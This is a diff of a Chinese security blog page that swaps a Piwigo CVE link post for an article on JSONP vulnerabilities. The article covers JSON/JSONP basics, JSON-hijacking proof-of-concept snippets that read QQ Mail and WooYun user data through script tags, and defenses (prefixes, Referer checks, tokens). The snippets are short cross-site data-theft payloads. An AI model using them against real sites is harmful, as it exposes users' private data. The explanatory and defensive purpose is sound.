@@ -4,29 +4,44 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>piwigo CVE-2014-9115 | xd_xd&#39;s blog</title>
+    <title>jsonp漏洞分析 | xd_xd&#39;s blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="xd_xd">
     
 
     
-    <meta name="description" content="免费开源相册Piwigo&amp;lt;= v2.7.1 SQL注入漏洞分析
-http://www.freebuf.com/articles/web/55075.html
-http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115">
+    <meta name="description" content="漏洞原理json(javascript object notation)是javascript对象表示法的意思。
+比如：
+var impromptu_object = {
+    &quot;given_name&quot; : &quot;john&quot;,
+    &quot;family_name&quot;: &quot;smith&quot;,
+    &quot;lucky_numbers&quot;: [11630,12067,12407,12887]
+};
+alert(imp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="piwigo CVE-2014-9115">
-<meta property="og:url" content="http://xdxd.love/2015/01/14/piwigo/index.html">
+<meta property="og:title" content="jsonp漏洞分析">
+<meta property="og:url" content="http://xdxd.love/2016/03/10/jsonp漏洞分析/index.html">
 <meta property="og:site_name" content="xd_xd's blog">
-<meta property="og:description" content="免费开源相册Piwigo&amp;lt;= v2.7.1 SQL注入漏洞分析
-http://www.freebuf.com/articles/web/55075.html
-http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115">
-<meta property="og:updated_time" content="2015-11-24T03:27:38.000Z">
+<meta property="og:description" content="漏洞原理json(javascript object notation)是javascript对象表示法的意思。
+比如：
+var impromptu_object = {
+    &quot;given_name&quot; : &quot;john&quot;,
+    &quot;family_name&quot;: &quot;smith&quot;,
+    &quot;lucky_numbers&quot;: [11630,12067,12407,12887]
+};
+alert(imp">
+<meta property="og:updated_time" content="2016-03-10T07:02:39.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="piwigo CVE-2014-9115">
-<meta name="twitter:description" content="免费开源相册Piwigo&amp;lt;= v2.7.1 SQL注入漏洞分析
-http://www.freebuf.com/articles/web/55075.html
-http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115">
+<meta name="twitter:title" content="jsonp漏洞分析">
+<meta name="twitter:description" content="漏洞原理json(javascript object notation)是javascript对象表示法的意思。
+比如：
+var impromptu_object = {
+    &quot;given_name&quot; : &quot;john&quot;,
+    &quot;family_name&quot;: &quot;smith&quot;,
+    &quot;lucky_numbers&quot;: [11630,12067,12407,12887]
+};
+alert(imp">
 
     
     <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
@@ -86,14 +101,14 @@ http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115">
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/01/14/piwigo/" title="piwigo CVE-2014-9115" itemprop="url">piwigo CVE-2014-9115</a>
+      <a href="/2016/03/10/jsonp漏洞分析/" title="jsonp漏洞分析" itemprop="url">jsonp漏洞分析</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="xd_xd" target="_blank" itemprop="author">xd_xd</a>
 		
   <p class="article-time">
-    <time datetime="2015-01-14T14:04:36.000Z" itemprop="datePublished"> 发表于 Jan 14 2015</time>
+    <time datetime="2016-03-10T02:46:53.000Z" itemprop="datePublished"> 发表于 Mar 10 2016</time>
     
   </p>
 </header>
@@ -102,17 +117,53 @@ http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115">
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方式"><span class="toc-number">2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#防御方案"><span class="toc-number">3.</span> <span class="toc-text">防御方案</span></a></li></ol>
 		
 		</div>
 		
-		<p>免费开源相册Piwigo&lt;= v2.7.1 SQL注入漏洞分析</p>
-<p><a href="http://www.freebuf.com/articles/web/55075.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/55075.html</a></p>
-<p><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115" target="_blank" rel="external">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115</a></p>
+		<h1 id="漏洞原理">漏洞原理</h1><p>json(javascript object notation)是javascript对象表示法的意思。</p>
+<p>比如：</p>
+<pre><code>var impromptu_object = {
+    <span class="string">"given_name"</span> : <span class="string">"john"</span>,
+    <span class="string">"family_name"</span>: <span class="string">"smith"</span>,
+    <span class="string">"lucky_numbers"</span>: [<span class="number">11630</span>,<span class="number">12067</span>,<span class="number">12407</span>,<span class="number">12887</span>]
+};
+alert(impromptu_object.given_name);
+</code></pre><p>运行结果是弹出john。</p>
+<p>jsonp字面上的含义是”填充式(padding)的JSON”,它通过填充二外的内容吧JSON序列化包装起来，变成一段有效的可以独立运行的Javascript语句。常见的例子包括函数调用(例如callback_function({…JSON data…}))或变量赋值(var return_value = {…JSON data…})</p>
+<h1 id="利用方式">利用方式</h1><p>返回值形式为：变量赋值的形式</p>
+<pre><code>Qmail.newMailsList={total:446,mailHome:"http://mail.qq.com/cgi-bin/login?f...
+
+
+<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">  
+<span class="keyword">var</span> Qmail={};   先定义变量
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
+<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://mail.qq.com/cgi-bin/login?fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
+<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">  
+alert(Qmail.newMailsList.nextUrl);  
+alert(<span class="built_in">document</span>.scripts[<span class="number">1</span>].src=Qmail.newMailsList.nextUrl);  
+alert(Qmail.newMailsList.summary);  
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
+</code></pre><p>返回值形式为函数调用</p>
+<pre><code><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">  
+<span class="function"><span class="keyword">function</span> <span class="title">wooyun_callback</span><span class="params">(a)</span></span>{  
+alert(a);  
+}  
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
+<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://www.wooyun.org/userdata.php?callback=wooyun_callback"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
+</code></pre><h1 id="防御方案">防御方案</h1><p>1，对于同域的json使用情况下，可以在数据的输出头部加入while(1);的方式避免数据被script标签的方式引用，这可以防止一些比较有特性的浏览器里导致的数据泄漏。腾讯的一个案例加了”-1”</p>
+<pre><code><span class="comment">//Ignoring The First Item "-1"Qmail.newMailsList={total:</span>
+</code></pre><p>2,referer的来源限制，利用前端referer的不可伪造性来保障请求数据的应用来源于可信的地方，此种方式力度较稀，完全依赖于referer，某些情况下（如存在xss）可能导致被绕过。</p>
+<p>3,token的加入，严格来说，这种利用javascript hijacking的方式获取数据是CSRF的一种，不过较之传统的CSRF不能获取数据只能提交而言，这种方式利用javascript可以获取一些敏感信息而已。如果我们能让攻击者对接口未知，就可以实现json hijacking的防御了。利用token对调用者的身份进行认证，这种方式对于调用者的身份会要求力度较细，但是一旦出现xss也可能导致前端Token的泄露，从而导致保护失效。</p>
   
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/前端安全/">前端安全</a>
+</div>
 
 
 </div>
@@ -121,7 +172,7 @@ http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115">
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://xdxd.love/2015/01/14/piwigo/" data-title="piwigo CVE-2014-9115 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
+	  <div data-url="http://xdxd.love/2016/03/10/jsonp漏洞分析/" data-title="jsonp漏洞分析 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -134,19 +185,11 @@ http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115">
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2015/01/21/break/" title="如果switch没有break(php,javascript)">
-  <strong>上一篇：</strong><br/>
-  <span>
-  如果switch没有break(php,javascript)</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2014/12/18/ecshop/"  title="ecshop patch15分析">
+<a href="/2016/03/09/使用转义防御XSS/"  title="使用转义防御XSS">
  <strong>下一篇：</strong><br/> 
- <span>ecshop patch15分析
+ <span>使用转义防御XSS
 </span>
 </a>
 </div>
@@ -155,7 +198,7 @@ http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115">
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/01/14/piwigo/" data-title="piwigo CVE-2014-9115" data-url="http://xdxd.love/2015/01/14/piwigo/"></div>
+	<div class="ds-thread" data-thread-key="2016/03/10/jsonp漏洞分析/" data-title="jsonp漏洞分析" data-url="http://xdxd.love/2016/03/10/jsonp漏洞分析/"></div>
 </section>
 
 
@@ -165,7 +208,7 @@ http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9115">
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方式"><span class="toc-number">2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#防御方案"><span class="toc-number">3.</span> <span class="toc-text">防御方案</span></a></li></ol>
  
   </div>
 
